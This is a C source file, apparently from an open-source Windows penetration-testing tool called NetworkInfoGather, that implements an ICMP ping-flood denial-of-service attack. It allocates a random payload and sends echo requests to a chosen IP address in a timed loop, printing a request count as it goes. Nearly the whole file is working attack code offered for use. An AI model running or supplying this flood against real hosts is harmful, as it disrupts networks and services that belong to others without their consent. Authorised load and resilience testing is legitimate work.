
/* 
 * NetworkInfoGather
 * Copyright (C) 2023  SecuProject
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <winsock2.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <stdio.h>

#include "MgArguments.h"
#include "AttackDOS.h"

#pragma warning(disable: 4996)

#define DEBUG_TEST 0

typedef struct {
    unsigned long ipaddr;
    HANDLE hIcmpFile;
    DWORD ReplySize;
    LPVOID ReplyBuffer;
    char* data;
}ICMP_DOS_STRUCT;

BOOL InitDosPing(char* ipAddress, DWORD dataSize, ICMP_DOS_STRUCT* icmpDosStruct) {
    icmpDosStruct->ipaddr = inet_addr(ipAddress);
    if (icmpDosStruct->ipaddr == INADDR_NONE) {
        return FALSE;
    }

    icmpDosStruct->hIcmpFile = IcmpCreateFile();
    if (icmpDosStruct->hIcmpFile == INVALID_HANDLE_VALUE) {
        printf("\t[x] IcmpCreatefile returned error: %ld\n", GetLastError());
        return FALSE;
    }

    icmpDosStruct->ReplySize = sizeof(ICMP_ECHO_REPLY) + dataSize;
    icmpDosStruct->ReplyBuffer = (VOID*)malloc(icmpDosStruct->ReplySize);
    if (icmpDosStruct->ReplyBuffer == NULL) {
        printf("\t[x] Unable to allocate memory\n");
        CloseHandle(icmpDosStruct->hIcmpFile);
        return FALSE;
    }

    icmpDosStruct->data = (char*)malloc(dataSize + 1);
    if (icmpDosStruct->data == NULL) {
        CloseHandle(icmpDosStruct->hIcmpFile);
        free(icmpDosStruct->ReplyBuffer);
        return FALSE;
    }

    CopyRandBuffer(icmpDosStruct->data, dataSize);

    return TRUE;
}
VOID CleanDosPing(char* ipAddress, DWORD dataSize, ICMP_DOS_STRUCT* icmpDosStruct) {
    CloseHandle(icmpDosStruct->hIcmpFile);
    free(icmpDosStruct->ReplyBuffer);
    free(icmpDosStruct->data);
}


BOOL PingDos(ICMP_DOS_STRUCT icmpDosStruct, DWORD dataSize) {
    if (IcmpSendEcho(icmpDosStruct.hIcmpFile, icmpDosStruct.ipaddr, icmpDosStruct.data, (WORD)dataSize,
        NULL, icmpDosStruct.ReplyBuffer, icmpDosStruct.ReplySize, 1000) != 0) {
#if DEBUG_TEST
        PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)icmpDosStruct.ReplyBuffer;
        //struct in_addr ReplyAddr;
        //ReplyAddr.S_un.S_addr = pEchoReply->Address;

        if (pEchoReply->RoundTripTime > 1) {
            printf("Reply from %s: bytes=%d time%.2ldms TTL=%ul\n", ipAddress, dataSize, pEchoReply->RoundTripTime, pEchoReply->Options.Ttl);
        } else {
            printf("Reply from %s: bytes=%d time<1ms TTL=%lu\n", ipAddress, dataSize, pEchoReply->Options.Ttl);
        }
#endif 
        return TRUE;
    }
    return FALSE;
}

int AttackFloodPing(char* ipAddress, UINT dataSize, UINT waitTime) {
    ICMP_DOS_STRUCT icmpDosStruct;

    clock_t startTime = clock();
    clock_t currentTime = clock();

    printf("[-] Attack Flooding with ICMP - PING\n");

    InitDosPing(ipAddress, dataSize, &icmpDosStruct);

    for (UINT i = 0; (clock_t)(startTime + waitTime) > currentTime; i++) {
        PingDos(icmpDosStruct, dataSize);
        printf("[i] Request number: %i\r", i);
        currentTime = clock();
    }
    PingDos(icmpDosStruct, dataSize);

    return 0;
}